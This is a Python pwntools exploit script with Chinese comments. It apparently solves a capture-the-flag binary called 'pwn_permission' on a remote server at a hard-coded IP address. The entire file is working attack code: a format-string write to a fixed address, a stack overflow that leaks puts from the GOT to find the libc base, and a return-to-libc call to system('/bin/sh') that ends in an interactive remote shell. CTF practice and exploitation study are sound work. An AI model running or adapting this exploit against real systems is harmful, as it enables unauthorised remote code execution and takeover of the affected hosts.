
from pwn import *
import time

context(arch='i386', os='linux', log_level='info')

elf = ELF('pwn_permission')

# ====== 已知准确的偏移 ======
PUTS_OFFSET = 0x6d1e0
BINSH_OFFSET = 0x18c363

# ====== 连接服务器 ======
conn = remote('39.96.193.120', 10000)
conn.recv(timeout=5)

# ====== Step 1: 用格式字符串设置target_val=5 ======
target_val_addr = 0x804c030
fmt_payload = b'%5c%6$na' + p32(target_val_addr)
conn.send(fmt_payload)
time.sleep(2)

response = conn.recv(timeout=5)
if b'Input:' not in response:
    log.error("没触发vuln！")
    conn.close()
    exit(1)

log.success("vuln函数已触发！")

# ====== Step 2: 泄露puts地址 ======
write_plt = elf.plt['write']
puts_got = elf.got['puts']
vuln_addr = elf.symbols['vuln']

payload = b'A' * 148
payload += p32(write_plt)
payload += p32(vuln_addr)
payload += p32(1)
payload += p32(puts_got)
payload += p32(4)

conn.send(payload)
time.sleep(2)

response = conn.recv(timeout=5)
puts_leak = u32(response[:4])
log.info(f"puts地址: 0x{puts_leak:x}")

# ====== Step 3: 计算libc地址 ======
libc_base = puts_leak - PUTS_OFFSET
libc_puts = libc_base + PUTS_OFFSET
binsh_addr = libc_base + BINSH_OFFSET

log.info(f"libc基址: 0x{libc_base:x}")
log.info(f"libc_puts地址: 0x{libc_puts:x}")
log.info(f"binsh地址: 0x{binsh_addr:x}")

# ====== Step 4: 现在我们调用程序里的puts_plt来打印binsh_addr ======
# 我们用程序里的puts@plt，而不是libc里的puts，这样更稳定！
payload2 = b'A' * 148
payload2 += p32(elf.plt['puts'])
payload2 += p32(vuln_addr)
payload2 += p32(binsh_addr)

log.info("发送payload来打印/bin/sh...")
conn.send(payload2)
time.sleep(2)

try:
    output = conn.recv(timeout=3)
    log.info(f"收到的内容: {output}")
    
    if b'/bin/sh' in output:
        log.success("🎉🎉🎉 完美！我们的libc基址完全正确！")
        
        # 现在我们再试一下system
        log.info("现在我们试一下system...")
        system_addr = libc_base + 0x41360
        
        payload3 = b'A' * 148
        payload3 += p32(system_addr)
        payload3 += p32(vuln_addr)
        payload3 += p32(binsh_addr)
        
        conn.send(payload3)
        time.sleep(1)
        
        log.info("进入交互模式！")
        conn.interactive()
        
except Exception as e:
    log.error(f"发生错误: {e}")

conn.close()
